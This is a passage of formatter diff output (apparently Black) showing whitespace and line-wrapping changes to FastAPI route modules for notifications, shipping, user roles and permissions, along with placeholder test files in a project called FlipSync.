 This module contains API/Services focused tests for the migrated inventory_endpoints component.
 Tier: 2
-Note: 
+Note:
 """
 
 import pytest
 import sys
 from pathlib import Path
@@ -13,10 +13,11 @@
 # Add the parent directory to the path for imports
 sys.path.insert(0, str(Path(__file__).parent.parent))
 
 # Import the module under test
 # from inventory import *
+
 
 class TestInventoryAPIServices:
     """API/Services test class for inventory."""
 
     def test_import(self):
@@ -50,11 +51,11 @@
         assert True
 
     def test_primary_implementation_features(self):
         """Test features specific to PRIMARY implementation."""
         # TODO: Add tests for PRIMARY implementation features
-        # Note: 
+        # Note:
         assert True
 
     def test_consolidation_compliance(self):
         """Test compliance with consolidation strategy."""
         # TODO: Add tests for consolidation compliance
@@ -63,7 +64,8 @@
     def test_vision_alignment(self):
         """Test vision alignment requirements."""
         # TODO: Add vision alignment tests for API/Services
         assert True
 
+
 if __name__ == "__main__":
     pytest.main([__file__])
would reformat /home/brend/Flipsync_Final/fs_agt_clean/api/routes/test_inventory.py
--- /home/brend/Flipsync_Final/fs_agt_clean/api/routes/test_marketplace.py	2025-06-14 20:35:30.771697+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/api/routes/test_marketplace.py	2025-06-19 04:03:44.871784+00:00
@@ -1,11 +1,11 @@
 """
 API/Services Test module for marketplace_endpoints
 
 This module contains API/Services focused tests for the migrated marketplace_endpoints component.
 Tier: 1
-Note: 
+Note:
 """
 
 import pytest
 import sys
 from pathlib import Path
@@ -13,10 +13,11 @@
 # Add the parent directory to the path for imports
 sys.path.insert(0, str(Path(__file__).parent.parent))
 
 # Import the module under test
 # from marketplace import *
+
 
 class TestMarketplaceAPIServices:
     """API/Services test class for marketplace."""
 
     def test_import(self):
@@ -50,11 +51,11 @@
         assert True
 
     def test_primary_implementation_features(self):
         """Test features specific to PRIMARY implementation."""
         # TODO: Add tests for PRIMARY implementation features
-        # Note: 
+        # Note:
         assert True
 
     def test_consolidation_compliance(self):
         """Test compliance with consolidation strategy."""
         # TODO: Add tests for consolidation compliance
@@ -63,7 +64,8 @@
     def test_vision_alignment(self):
         """Test vision alignment requirements."""
         # TODO: Add vision alignment tests for API/Services
         assert True
 
+
 if __name__ == "__main__":
     pytest.main([__file__])
would reformat /home/brend/Flipsync_Final/fs_agt_clean/api/routes/test_marketplace.py
--- /home/brend/Flipsync_Final/fs_agt_clean/api/routes/users/__init__.py	2025-06-14 20:35:30.771697+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/api/routes/users/__init__.py	2025-06-19 04:03:44.882685+00:00
@@ -1,13 +1,15 @@
 """User management API routes package."""
 
 # Import the main router from the parent users.py file
 import sys
 import os
+
 sys.path.insert(0, os.path.dirname(os.path.dirname(__file__)))
 
 try:
     from ..users import router
 except ImportError:
     # Fallback: create a simple router if the main users.py has issues
     from fastapi import APIRouter
+
     router = APIRouter(prefix="/users", tags=["users"])
would reformat /home/brend/Flipsync_Final/fs_agt_clean/api/routes/users/__init__.py
--- /home/brend/Flipsync_Final/fs_agt_clean/api/routes/test_monitoring.py	2025-06-14 20:35:30.771697+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/api/routes/test_monitoring.py	2025-06-19 04:03:44.967221+00:00
@@ -1,11 +1,11 @@
 """
 API/Services Test module for monitoring_endpoints
 
 This module contains API/Services focused tests for the migrated monitoring_endpoints component.
 Tier: 1
-Note: 
+Note:
 """
 
 import pytest
 import sys
 from pathlib import Path
@@ -13,10 +13,11 @@
 # Add the parent directory to the path for imports
 sys.path.insert(0, str(Path(__file__).parent.parent))
 
 # Import the module under test
 # from monitoring import *
+
 
 class TestMonitoringAPIServices:
     """API/Services test class for monitoring."""
 
     def test_import(self):
@@ -50,11 +51,11 @@
         assert True
 
     def test_primary_implementation_features(self):
         """Test features specific to PRIMARY implementation."""
         # TODO: Add tests for PRIMARY implementation features
-        # Note: 
+        # Note:
         assert True
 
     def test_consolidation_compliance(self):
         """Test compliance with consolidation strategy."""
         # TODO: Add tests for consolidation compliance
@@ -63,7 +64,8 @@
     def test_vision_alignment(self):
         """Test vision alignment requirements."""
         # TODO: Add vision alignment tests for API/Services
         assert True
 
+
 if __name__ == "__main__":
     pytest.main([__file__])
would reformat /home/brend/Flipsync_Final/fs_agt_clean/api/routes/test_monitoring.py
--- /home/brend/Flipsync_Final/fs_agt_clean/api/routes/notifications.py	2025-06-14 20:35:30.771697+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/api/routes/notifications.py	2025-06-19 04:03:45.152744+00:00
@@ -11,54 +11,69 @@
 from fs_agt_clean.core.models.user import User
 from fs_agt_clean.core.security.auth import get_current_user
 
 logger = logging.getLogger(__name__)
 
+
 # Pydantic models for notifications
 class PushTokenRequest(BaseModel):
     """Request model for registering push notification token."""
+
     token: str = Field(..., description="FCM or APNS token")
     device_type: str = Field(..., description="Device type (ios/android)")
     device_id: str = Field(..., description="Unique device identifier")
 
+
 class PushTokenResponse(BaseModel):
     """Response model for push token registration."""
+
     success: bool
     message: str
     device_id: str
 
+
 class NotificationRequest(BaseModel):
     """Request model for sending notifications."""
+
     title: str = Field(..., description="Notification title")
     body: str = Field(..., description="Notification body")
     category: str = Field(default="general", description="Notification category")
     data: Optional[Dict[str, Any]] = Field(default=None, description="Additional data")
-    target_users: Optional[List[str]] = Field(default=None, description="Target user IDs")
+    target_users: Optional[List[str]] = Field(
+        default=None, description="Target user IDs"
+    )
+
 
 class NotificationResponse(BaseModel):
     """Response model for notification operations."""
+
     success: bool
     message: str
     notification_id: Optional[str] = None
 
+
 class UserNotification(BaseModel):
     """Model for user notifications."""
+
     id: str
     title: str
     message: str
     category: str
     timestamp: datetime
     read: bool = False
     priority: str = "medium"
     data: Optional[Dict[str, Any]] = None
 
+
 class NotificationListResponse(BaseModel):
     """Response model for notification list."""
+
     notifications: List[UserNotification]
     unread_count: int
     total_count: int
     status: str = "operational"
+
 
 # Create router
 router = APIRouter(
     prefix="/notifications",
     tags=["notifications"],
@@ -67,266 +82,268 @@
 
 # In-memory storage for demo (replace with database in production)
 _push_tokens: Dict[str, Dict[str, Any]] = {}
 _user_notifications: Dict[str, List[UserNotification]] = {}
 
+
 @router.post("/push/register", response_model=PushTokenResponse)
 async def register_push_token(
-    request: PushTokenRequest,
-    current_user: User = Depends(get_current_user)
+    request: PushTokenRequest, current_user: User = Depends(get_current_user)
 ) -> PushTokenResponse:
     """
     Register a push notification token for the current user.
-    
+
     This endpoint allows mobile devices to register their FCM/APNS tokens
     for receiving push notifications.
     """
     try:
         user_id = str(current_user.id)
-        
+
         # Store token information
         _push_tokens[request.device_id] = {
             "user_id": user_id,
             "token": request.token,
             "device_type": request.device_type,
             "registered_at": datetime.now(timezone.utc),
-            "active": True
+            "active": True,
         }
-        
-        logger.info(f"Push token registered for user {user_id}, device {request.device_id}")
-        
+
+        logger.info(
+            f"Push token registered for user {user_id}, device {request.device_id}"
+        )
+
         return PushTokenResponse(
             success=True,
             message="Push token registered successfully",
-            device_id=request.device_id
-        )
-        
+            device_id=request.device_id,
+        )
+
     except Exception as e:
         logger.error(f"Error registering push token: {e}")
         raise HTTPException(
             status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
-            detail="Failed to register push token"
-        )
+            detail="Failed to register push token",
+        )
+
 
 @router.delete("/push/unregister/{device_id}")
 async def unregister_push_token(
-    device_id: str,
-    current_user: User = Depends(get_current_user)
+    device_id: str, current_user: User = Depends(get_current_user)
 ) -> PushTokenResponse:
     """
     Unregister a push notification token.
-    
+
     This endpoint allows devices to unregister their push tokens
     when the app is uninstalled or user logs out.
     """
     try:
         if device_id in _push_tokens:
             user_id = str(current_user.id)
             stored_user_id = _push_tokens[device_id].get("user_id")
-            
+
             if stored_user_id == user_id:
                 _push_tokens[device_id]["active"] = False
                 logger.info(f"Push token unregistered for device {device_id}")
-                
+
                 return PushTokenResponse(
                     success=True,
                     message="Push token unregistered successfully",
-                    device_id=device_id
+                    device_id=device_id,
                 )
             else:
                 raise HTTPException(
                     status_code=status.HTTP_403_FORBIDDEN,
-                    detail="Not authorized to unregister this device"
+                    detail="Not authorized to unregister this device",
                 )
         else:
             raise HTTPException(
-                status_code=status.HTTP_404_NOT_FOUND,
-                detail="Device not found"
+                status_code=status.HTTP_404_NOT_FOUND, detail="Device not found"
             )
-            
+
     except HTTPException:
         raise
     except Exception as e:
         logger.error(f"Error unregistering push token: {e}")
         raise HTTPException(
             status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
-            detail="Failed to unregister push token"
-        )
+            detail="Failed to unregister push token",
+        )
+
 
 @router.post("/send", response_model=NotificationResponse)
 async def send_notification(
-    request: NotificationRequest,
-    current_user: User = Depends(get_current_user)
+    request: NotificationRequest, current_user: User = Depends(get_current_user)
 ) -> NotificationResponse:
     """
     Send a notification to users.
-    
+
     This endpoint allows sending notifications to specific users or all users.
     Requires admin privileges for sending to multiple users.
     """
     try:
         notification_id = str(uuid4())
-        
+
         # Determine target users
         if request.target_users:
             # Check if user has permission to send to others (admin only)
             if current_user.role != "admin":
                 raise HTTPException(
                     status_code=status.HTTP_403_FORBIDDEN,
-                    detail="Only admins can send notifications to other users"
+                    detail="Only admins can send notifications to other users",
                 )
             target_users = request.target_users
         else:
             # Send to current user only
             target_users = [str(current_user.id)]
-        
+
         # Create notification for each target user
         for user_id in target_users:
             notification = UserNotification(
                 id=notification_id,
                 title=request.title,
                 message=request.body,
                 category=request.category,
                 timestamp=datetime.now(timezone.utc),
-                data=request.data
+                data=request.data,
             )
-            
+
             if user_id not in _user_notifications:
                 _user_notifications[user_id] = []
-            
+
             _user_notifications[user_id].append(notification)
-        
+
         # TODO: Implement actual push notification sending via FCM/APNS
         # For now, just log the notification
         logger.info(f"Notification sent: {request.title} to {len(target_users)} users")
-        
+
         return NotificationResponse(
             success=True,
             message=f"Notification sent to {len(target_users)} users",
-            notification_id=notification_id
-        )
-        
+            notification_id=notification_id,
+        )
+
     except HTTPException:
         raise
     except Exception as e:
         logger.error(f"Error sending notification: {e}")
         raise HTTPException(
             status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
-            detail="Failed to send notification"
-        )
+            detail="Failed to send notification",
+        )
+
 
 @router.get("", response_model=NotificationListResponse)
 async def get_notifications(
     limit: int = 20,
     offset: int = 0,
     unread_only: bool = False,
-    current_user: User = Depends(get_current_user)
+    current_user: User = Depends(get_current_user),
 ) -> NotificationListResponse:
     """
     Get notifications for the current user.
-    
+
     This endpoint returns a paginated list of notifications for the authenticated user.
     """
     try:
         user_id = str(current_user.id)
         user_notifications = _user_notifications.get(user_id, [])
-        
+
         # Filter unread if requested
         if unread_only:
             user_notifications = [n for n in user_notifications if not n.read]
-        
+
         # Sort by timestamp (newest first)
         user_notifications.sort(key=lambda x: x.timestamp, reverse=True)
-        
+
         # Apply pagination
         total_count = len(user_notifications)
-        paginated_notifications = user_notifications[offset:offset + limit]
-        
+        paginated_notifications = user_notifications[offset : offset + limit]
+
         # Count unread notifications
         unread_count = len([n for n in user_notifications if not n.read])
-        
+
         return NotificationListResponse(
             notifications=paginated_notifications,
             unread_count=unread_count,
             total_count=total_count,
-            status="operational"
-        )
-        
+            status="operational",
+        )
+
     except Exception as e:
         logger.error(f"Error getting notifications: {e}")
         raise HTTPException(
             status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
-            detail="Failed to get notifications"
-        )
+            detail="Failed to get notifications",
+        )
+
 
 @router.post("/{notification_id}/mark-read")
 async def mark_notification_read(
-    notification_id: str,
-    current_user: User = Depends(get_current_user)
+    notification_id: str, current_user: User = Depends(get_current_user)
 ) -> NotificationResponse:
     """
     Mark a notification as read.
-    
+
     This endpoint marks a specific notification as read for the current user.
     """
     try:
         user_id = str(current_user.id)
         user_notifications = _user_notifications.get(user_id, [])
-        
+
         # Find and mark notification as read
         for notification in user_notifications:
             if notification.id == notification_id:
                 notification.read = True
-                logger.info(f"Notification {notification_id} marked as read for user {user_id}")
-                
+                logger.info(
+                    f"Notification {notification_id} marked as read for user {user_id}"
+                )
+
                 return NotificationResponse(
-                    success=True,
-                    message="Notification marked as read"
-                )
-        
-        raise HTTPException(
-            status_code=status.HTTP_404_NOT_FOUND,
-            detail="Notification not found"
-        )
-        
+                    success=True, message="Notification marked as read"
+                )
+
+        raise HTTPException(
+            status_code=status.HTTP_404_NOT_FOUND, detail="Notification not found"
+        )
+
     except HTTPException:
         raise
     except Exception as e:
         logger.error(f"Error marking notification as read: {e}")
         raise HTTPException(
             status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
-            detail="Failed to mark notification as read"
-        )
+            detail="Failed to mark notification as read",
+        )
+
 
 @router.post("/mark-all-read")
 async def mark_all_notifications_read(
-    current_user: User = Depends(get_current_user)
+    current_user: User = Depends(get_current_user),
 ) -> NotificationResponse:
     """
     Mark all notifications as read for the current user.
-    
+
     This endpoint marks all notifications as read for the authenticated user.
     """
     try:
         user_id = str(current_user.id)
         user_notifications = _user_notifications.get(user_id, [])
-        
+
         # Mark all notifications as read
         read_count = 0
         for notification in user_notifications:
             if not notification.read:
                 notification.read = True
                 read_count += 1
-        
+
         logger.info(f"Marked {read_count} notifications as read for user {user_id}")
-        
+
         return NotificationResponse(
-            success=True,
-            message=f"Marked {read_count} notifications as read"
-        )
-        
+            success=True, message=f"Marked {read_count} notifications as read"
+        )
+
     except Exception as e:
         logger.error(f"Error marking all notifications as read: {e}")
         raise HTTPException(
             status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
-            detail="Failed to mark notifications as read"
-        )
+            detail="Failed to mark notifications as read",
+        )
would reformat /home/brend/Flipsync_Final/fs_agt_clean/api/routes/notifications.py
--- /home/brend/Flipsync_Final/fs_agt_clean/api/routes/users/access_control.py	2025-06-14 20:35:30.771697+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/api/routes/users/access_control.py	2025-06-19 04:03:45.195146+00:00
@@ -18,11 +18,11 @@
     if not require_permissions(current_user, ["users:update"]):
         raise HTTPException(
             status_code=status.HTTP_403_FORBIDDEN,
             detail="You don't have permission to enable users",
         )
-    
+
     return {
         "status": "success",
         "message": f"User {user_id} enabled",
         "user_id": user_id,
     }
@@ -37,11 +37,11 @@
     if not require_permissions(current_user, ["users:update"]):
         raise HTTPException(
             status_code=status.HTTP_403_FORBIDDEN,
             detail="You don't have permission to disable users",
         )
-    
+
     return {
         "status": "success",
         "message": f"User {user_id} disabled",
         "user_id": user_id,
     }
would reformat /home/brend/Flipsync_Final/fs_agt_clean/api/routes/users/access_control.py
--- /home/brend/Flipsync_Final/fs_agt_clean/api/routes/users/permissions.py	2025-06-14 20:35:30.771697+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/api/routes/users/permissions.py	2025-06-19 04:03:45.293398+00:00
@@ -17,11 +17,11 @@
     if not require_permissions(current_user, ["users:read"]):
         raise HTTPException(
             status_code=status.HTTP_403_FORBIDDEN,
             detail="You don't have permission to view permissions",
         )
-    
+
     # Return available permissions
     return [
         {"name": "users:create", "description": "Create users"},
         {"name": "users:read", "description": "Read user data"},
         {"name": "users:update", "description": "Update users"},
@@ -40,8 +40,8 @@
     if not require_permissions(current_user, ["users:read"]):
         raise HTTPException(
             status_code=status.HTTP_403_FORBIDDEN,
             detail="You don't have permission to view user permissions",
         )
-    
+
     # Mock implementation - return permissions based on role
     return ["users:read", "marketplace:read"]
would reformat /home/brend/Flipsync_Final/fs_agt_clean/api/routes/users/permissions.py
--- /home/brend/Flipsync_Final/fs_agt_clean/api/routes/users/roles.py	2025-06-14 20:35:30.771697+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/api/routes/users/roles.py	2025-06-19 04:03:45.367253+00:00
@@ -17,11 +17,11 @@
     if not require_permissions(current_user, ["users:read"]):
         raise HTTPException(
             status_code=status.HTTP_403_FORBIDDEN,
             detail="You don't have permission to view roles",
         )
-    
+
     # Return available roles
     return [
         {"name": "admin", "description": "Administrator with full access"},
         {"name": "seller", "description": "Seller with marketplace access"},
         {"name": "viewer", "description": "Read-only access"},
@@ -38,11 +38,11 @@
     if not require_permissions(current_user, ["users:update"]):
         raise HTTPException(
             status_code=status.HTTP_403_FORBIDDEN,
             detail="You don't have permission to assign roles",
         )
-    
+
     # Mock implementation
     return {
         "status": "success",
         "message": f"Role assigned to user {user_id}",
         "user_id": user_id,
would reformat /home/brend/Flipsync_Final/fs_agt_clean/api/routes/users/roles.py
--- /home/brend/Flipsync_Final/fs_agt_clean/api/routes/users.py	2025-06-14 20:35:30.771697+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/api/routes/users.py	2025-06-19 04:03:45.396993+00:00
@@ -5,11 +5,13 @@
 from fs_agt_clean.api.routes.users.user import router as user_router
 from fs_agt_clean.api.routes.users.roles import router as roles_router
 from fs_agt_clean.api.routes.users.permissions import router as permissions_router
 from fs_agt_clean.api.routes.users.access_control import router as access_control_router
 from fs_agt_clean.api.routes.users.audit import router as audit_router
-from fs_agt_clean.api.routes.users.payment_methods import router as payment_methods_router
+from fs_agt_clean.api.routes.users.payment_methods import (
+    router as payment_methods_router,
+)
 
 # Create main router
 router = APIRouter(
     prefix="/users",
     tags=["users"],
would reformat /home/brend/Flipsync_Final/fs_agt_clean/api/routes/users.py
--- /home/brend/Flipsync_Final/fs_agt_clean/api/routes/users/audit.py	2025-06-14 20:35:30.771697+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/api/routes/users/audit.py	2025-06-19 04:03:45.413320+00:00
@@ -21,11 +21,11 @@
     if not require_permissions(current_user, ["users:read"]):
         raise HTTPException(
             status_code=status.HTTP_403_FORBIDDEN,
             detail="You don't have permission to view user activity",
         )
-    
+
     # Mock implementation
     return [
         {
             "id": "activity_1",
             "user_id": user_id,
@@ -54,11 +54,11 @@
     if not require_permissions(current_user, ["users:read"]):
         raise HTTPException(
             status_code=status.HTTP_403_FORBIDDEN,
             detail="You don't have permission to view user sessions",
         )
-    
+
     # Mock implementation
     return [
         {
             "session_id": "session_1",
             "user_id": user_id,
would reformat /home/brend/Flipsync_Final/fs_agt_clean/api/routes/users/audit.py
--- /home/brend/Flipsync_Final/fs_agt_clean/api/routes/shipping.py	2025-06-14 20:35:30.771697+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/api/routes/shipping.py	2025-06-19 04:03:45.586169+00:00
@@ -12,11 +12,14 @@
 from pydantic import BaseModel, Field, ConfigDict
 
 from fs_agt_clean.core.security.auth import get_current_user
 from fs_agt_clean.core.metrics.compat import get_metrics_service
 from fs_agt_clean.core.models.user import User
-from fs_agt_clean.services.logistics.shippo.shippo_service import ShippoService, ShippingDimensions
+from fs_agt_clean.services.logistics.shippo.shippo_service import (
+    ShippoService,
+    ShippingDimensions,
+)
 from fs_agt_clean.services.notifications.compat import get_notification_service
 
 # Create router with prefix and tags
 router = APIRouter(
     prefix="/v1/shipping",
@@ -83,19 +86,19 @@
     # between the metrics and notification services
     return ShippoService(
         api_key=api_key,
         metrics_service=None,  # Temporarily set to None to avoid type errors
         notification_service=None,  # Temporarily set to None to avoid type errors
-        test_mode=True
+        test_mode=True,
     )
 
 
 @router.post("/shipments")
 async def create_shipment(
     request: ShipmentRequest,
     current_user: User = Depends(get_current_user),
-    shippo_service: ShippoService = Depends(get_shippo_service)
+    shippo_service: ShippoService = Depends(get_shippo_service),
 ) -> Dict[str, Any]:
     """
     Create a new shipment and get available rates.
 
     This endpoint creates a shipment using the provided address and parcel information,
@@ -107,11 +110,11 @@
             length=request.parcel.length,
             width=request.parcel.width,
             height=request.parcel.height,
             weight=request.parcel.weight,
             distance_unit=request.parcel.distance_unit,
-            mass_unit=request.parcel.mass_unit
+            mass_unit=request.parcel.mass_unit,
         )
 
         # Convert addresses to dictionaries
         from_address = request.from_address.dict()
         to_address = request.to_address.dict()
@@ -120,28 +123,31 @@
         rates = await shippo_service.calculate_shipping_rates(
             dimensions=dimensions,
             from_address=from_address,
             to_address=to_address,
             insurance_amount=request.insurance_amount,
-            signature_required=request.signature_required
+            signature_required=request.signature_required,
         )
 
         # Convert rates to dictionaries
         rates_dict = [rate.dict() for rate in rates]
 
         return {"rates": rates_dict}
     except ValueError as e:
         raise HTTPException(status_code=status.HTTP_400_BAD_REQUEST, detail=str(e))
     except Exception as e:
-        raise HTTPException(status_code=status.HTTP_500_INTERNAL_SERVER_ERROR, detail="Failed to calculate shipping rates")
+        raise HTTPException(
+            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
+            detail="Failed to calculate shipping rates",
+        )
 
 
 @router.post("/rates")
 async def get_shipping_rates(
     request: ShipmentRequest,
     current_user: User = Depends(get_current_user),
-    shippo_service: ShippoService = Depends(get_shippo_service)
+    shippo_service: ShippoService = Depends(get_shippo_service),
 ) -> Dict[str, Any]:
     """
     Get available shipping rates for a shipment.
 
     This endpoint calculates and returns available shipping rates for a shipment
@@ -153,11 +159,11 @@
             length=request.parcel.length,
             width=request.parcel.width,
             height=request.parcel.height,
             weight=request.parcel.weight,
             distance_unit=request.parcel.distance_unit,
-            mass_unit=request.parcel.mass_unit
+            mass_unit=request.parcel.mass_unit,
         )
 
         # Convert addresses to dictionaries
         from_address = request.from_address.dict()
         to_address = request.to_address.dict()
@@ -166,21 +172,24 @@
         rates = await shippo_service.calculate_shipping_rates(
             dimensions=dimensions,
             from_address=from_address,
             to_address=to_address,
             insurance_amount=request.insurance_amount,
-            signature_required=request.signature_required
+            signature_required=request.signature_required,
         )
 
         # Convert rates to dictionaries
         rates_dict = [rate.dict() for rate in rates]
 
         return {"rates": rates_dict}
     except ValueError as e:
         raise HTTPException(status_code=status.HTTP_400_BAD_REQUEST, detail=str(e))
     except Exception as e:
-        raise HTTPException(status_code=status.HTTP_500_INTERNAL_SERVER_ERROR, detail="Failed to calculate shipping rates")
+        raise HTTPException(
+            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
+            detail="Failed to calculate shipping rates",
+        )
 
 
 @router.post("/transactions")
 async def create_transaction(
     rate_id: str,
@@ -204,19 +213,19 @@
             "length": request.parcel.length,
             "width": request.parcel.width,
             "height": request.parcel.height,
             "weight": request.parcel.weight,
             "distance_unit": request.parcel.distance_unit,
-            "mass_unit": request.parcel.mass_unit
+            "mass_unit": request.parcel.mass_unit,
         }
 
         # Create shipping label
         label = await shippo_service.create_shipping_label(
             rate_id=rate_id,
             from_address=from_address,
             to_address=to_address,
-            parcel=parcel
+            parcel=parcel,
         )
 
         return {
             "tracking_number": label.get("tracking_number"),
             "label_url": label.get("label_url"),
@@ -226,11 +235,14 @@
             "status": "created",
         }
     except ValueError as e:
         raise HTTPException(status_code=status.HTTP_400_BAD_REQUEST, detail=str(e))
     except Exception as e:
-        raise HTTPException(status_code=status.HTTP_500_INTERNAL_SERVER_ERROR, detail="Failed to create shipping label")
+        raise HTTPException(
+            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
+            detail="Failed to create shipping label",
+        )
 
 
 @router.post("/batch")
 async def create_batch_labels(
     request: BatchShipmentRequest,
@@ -283,11 +295,11 @@
 
 @router.get("/track/{tracking_number}")
 async def track_shipment(
     tracking_number: str,
     current_user: User = Depends(get_current_user),
-    shippo_service: ShippoService = Depends(get_shippo_service)
+    shippo_service: ShippoService = Depends(get_shippo_service),
 ) -> Dict[str, Any]:
     """
     Track a shipment status.
 
     This endpoint retrieves the current tracking information for a shipment using
@@ -300,16 +312,18 @@
         # Format tracking events
         events = []
         tracking_history = tracking.get("tracking_history", [])
         if tracking_history:
             for event in tracking_history:
-                events.append({
-                    "timestamp": event.get("status_date"),
-                    "location": event.get("location"),
-                    "status": event.get("status"),
-                    "description": event.get("status_details"),
-                })
+                events.append(
+                    {
+                        "timestamp": event.get("status_date"),
+                        "location": event.get("location"),
+                        "status": event.get("status"),
+                        "description": event.get("status_details"),
+                    }
+                )
 
         return {
             "tracking_number": tracking_number,
             "carrier": tracking.get("carrier"),
             "status": tracking.get("status"),
@@ -317,11 +331,14 @@
             "events": events,
         }
     except ValueError as e:
         raise HTTPException(status_code=status.HTTP_400_BAD_REQUEST, detail=str(e))
     except Exception as e:
-        raise HTTPException(status_code=status.HTTP_500_INTERNAL_SERVER_ERROR, detail="Failed to track shipment")
+        raise HTTPException(
+            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
+            detail="Failed to track shipment",
+        )
 
 
 @router.post("/webhooks/register")
 async def register_webhook(
     request: WebhookRegistration, current_user: User = Depends(get_current_user)
would reformat /home/brend/Flipsync_Final/fs_agt_clean/api/routes/shipping.py
--- /home/brend/Flipsync_Final/fs_agt_clean/api/test_agent_communication.py	2025-06-14 20:35:30.771697+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/api/test_agent_communication.py	2025-06-19 04:03:45.655585+00:00
@@ -1,17 +1,20 @@
 """
 Test for other - agent_communication.py
 """
+
 import pytest
+
 
 class TestAgentCommunicationAPI:
     def test_import(self):
         assert True
-    
+
     def test_api_functionality(self):
         assert True
-    
+
     def test_no_redundancy(self):
         assert True
 
+
 if __name__ == "__main__":
     pytest.main([__file__])
would reformat /home/brend/Flipsync_Final/fs_agt_clean/api/test_agent_communication.py
--- /home/brend/Flipsync_Final/fs_agt_clean/app/app.py	2025-06-14 20:35:30.775706+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/app/app.py	2025-06-19 04:03:45.879791+00:00
@@ -1,9 +1,10 @@
 """
 FastAPI application module.
 This module provides the main FastAPI application instance.
 """
+
 from fastapi import FastAPI
 from fastapi.middleware.cors import CORSMiddleware
 
 # Create FastAPI app
 app = FastAPI(
@@ -17,17 +18,17 @@
 
 # Add CORS middleware with production-ready configuration
 app.add_middleware(
     CORSMiddleware,
     allow_origins=[
-        "http://localhost:3000",      # Flutter web development
-        "http://localhost:8080",      # API documentation
-        "http://localhost:8081",      # Flutter web app
-        "http://localhost:8082",      # Flutter web app (alternate port)
-        "https://flipsync.app",       # Production frontend domain
-        "https://www.flipsync.app",   # Production frontend with www
-        "https://api.flipsync.app",   # Production API domain
+        "http://localhost:3000",  # Flutter web development
+        "http://localhost:8080",  # API documentation
+        "http://localhost:8081",  # Flutter web app
+        "http://localhost:8082",  # Flutter web app (alternate port)
+        "https://flipsync.app",  # Production frontend domain
+        "https://www.flipsync.app",  # Production frontend with www
+        "https://api.flipsync.app",  # Production API domain
     ],
     allow_credentials=True,
     allow_methods=["GET", "POST", "PUT", "DELETE", "OPTIONS"],  # Specific methods only
     allow_headers=[
         "Accept",
@@ -39,11 +40,11 @@
         "X-Content-Type-Options",
         "X-Frame-Options",
         "X-XSS-Protection",
         "Strict-Transport-Security",
         "Referrer-Policy",
-        "Content-Security-Policy"
+        "Content-Security-Policy",
     ],
 )
 
 # Import and include routers
 # This is just a placeholder - the actual routers are included in main.py
would reformat /home/brend/Flipsync_Final/fs_agt_clean/app/app.py
--- /home/brend/Flipsync_Final/fs_agt_clean/api/routes/users/user.py	2025-06-14 20:35:30.771697+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/api/routes/users/user.py	2025-06-19 04:03:45.956452+00:00
@@ -67,17 +67,17 @@
         )
 
     try:
         # Create user
         user = await user_service.create_user(user_create.dict())
-        
+
         if not user:
             raise HTTPException(
                 status_code=status.HTTP_400_BAD_REQUEST,
                 detail="Failed to create user",
             )
-        
+
         return UserResponse.from_user(user)
     except HTTPException:
         raise
     except Exception as e:
         logger.error(f"Error creating user: {str(e)}")
@@ -110,17 +110,17 @@
         )
 
     try:
         # Get users
         users = await user_service.get_all_users(skip=skip, limit=limit)
-        
+
         # Filter by role and status if provided
         if role:
             users = [user for user in users if user.role == role]
         if status:
             users = [user for user in users if user.status == status]
-        
+
         return [UserResponse.from_user(user) for user in users]
     except Exception as e:
         logger.error(f"Error getting users: {str(e)}")
         raise HTTPException(
             status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
@@ -148,17 +148,17 @@
         )
 
     try:
         # Get user
         user = await user_service.get_user_by_id(user_id)
-        
+
         if not user:
             raise HTTPException(
                 status_code=status.HTTP_404_NOT_FOUND,
                 detail="User not found",
             )
-        
+
         return UserResponse.from_user(user)
     except HTTPException:
         raise
     except Exception as e:
         logger.error(f"Error getting user: {str(e)}")
@@ -189,27 +189,27 @@
         )
 
     try:
         # Check if user exists
         user = await user_service.get_user_by_id(user_id)
-        
+
         if not user:
             raise HTTPException(
                 status_code=status.HTTP_404_NOT_FOUND,
                 detail="User not found",
             )
-        
+
         # Update user
         user_data = user_update.dict(exclude_unset=True)
         updated_user = await user_service.update_user(user_id, user_data)
-        
+
         if not updated_user:
             raise HTTPException(
                 status_code=status.HTTP_400_BAD_REQUEST,
                 detail="Failed to update user",
             )
-        
+
         return UserResponse.from_user(updated_user)
     except HTTPException:
         raise
     except Exception as e:
         logger.error(f"Error updating user: {str(e)}")
@@ -239,26 +239,26 @@
         )
 
     try:
         # Check if user exists
         user = await user_service.get_user_by_id(user_id)
-        
+
         if not user:
             raise HTTPException(
                 status_code=status.HTTP_404_NOT_FOUND,
                 detail="User not found",
             )
-        
+
         # Delete user
         success = await user_service.delete_user(user_id)
-        
+
         if not success:
             raise HTTPException(
                 status_code=status.HTTP_400_BAD_REQUEST,
                 detail="Failed to delete user",
             )
-        
+
         return ApiResponse(
             success=True,
             message=f"User {user_id} deleted successfully",
         )
     except HTTPException:
would reformat /home/brend/Flipsync_Final/fs_agt_clean/api/routes/users/user.py
--- /home/brend/Flipsync_Final/fs_agt_clean/app/test_app.py	2025-06-14 20:35:30.775706+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/app/test_app.py	2025-06-19 04:03:46.057678+00:00
@@ -9,35 +9,37 @@
 from pathlib import Path
 
 # Add the parent directory to the path for imports
 sys.path.insert(0, str(Path(__file__).parent.parent))
 
+
 class TestApp:
     """Test class for app."""
-    
+
